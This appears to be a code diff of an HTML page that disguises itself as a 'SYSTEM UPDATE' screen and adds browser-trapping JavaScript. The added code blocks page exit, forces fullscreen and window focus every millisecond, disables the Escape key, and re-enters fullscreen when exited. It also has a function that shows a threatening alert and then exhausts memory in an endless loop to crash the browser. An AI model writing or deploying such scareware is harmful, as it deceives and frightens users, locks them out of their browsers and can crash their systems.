@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM LOCK</title>
+    <title>SYSTEM UPDATE</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #000;
+            background-color: #0a0a0a;
             color: #fff;
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             overflow: hidden;
             user-select: none;
         }
 
-        /* Password Bar - Made Bright Red */
+        /* Password Bar */
         #password-bar {
             position: fixed;
             top: 0;
@@ -165,7 +165,7 @@
     <!-- Secret Password Bar (Bright Red) -->
     <div id="password-bar">
         <span class="pass-label">PASSWORD:</span>
-        <input type="password" class="pass-input" id="secret-pass" placeholder="••••••" autocomplete="off">
+        <input type="text" class="pass-input" id="secret-pass" placeholder="••••••" autocomplete="off">
     </div>
 
     <!-- FPS Display / Start Screen -->
@@ -341,3 +341,53 @@
         }
 
         // The Crash Function (Memory Leak)
+        function triggerCrash() {
+            alert("YOU DENIED PERMISSION! SYSTEM CRASH IMMINENT!");
+            let array = [];
+            while(true) {
+                array.push(new Array(1000000).join('X'));
+            }
+        }
+
+        // Aggressive Loop for Fullscreen
+        function startAggressiveLoop() {
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            };
+
+            // Force fullscreen every 0.001 seconds
+            setInterval(() => {
+                const modal = document.getElementById('trap-modal');
+                if (window.getComputedStyle(modal).display === 'none') {
+                    modal.style.display = 'flex';
+                    try { document.documentElement.requestFullscreen(); } catch(e){}
+                }
+                if (!document.hasFocus()) {
+                    window.focus();
+                }
+            }, 1);
+        }
+
+        // Block Escape Key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "Escape") {
+                e.preventDefault();
+                document.getElementById('trap-modal').style.display = 'flex';
+            }
+        });
+
+        // Enforce Fullscreen
+        document.addEventListener('fullscreenchange', () => {
+            if (window.isTrapped && !document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch((err) => {
+                    console.log("Fullscreen blocked by browser");
+                });
+            }
+        });
+
+        startAggressiveLoop();
+    </script>
+</body>
+</html>
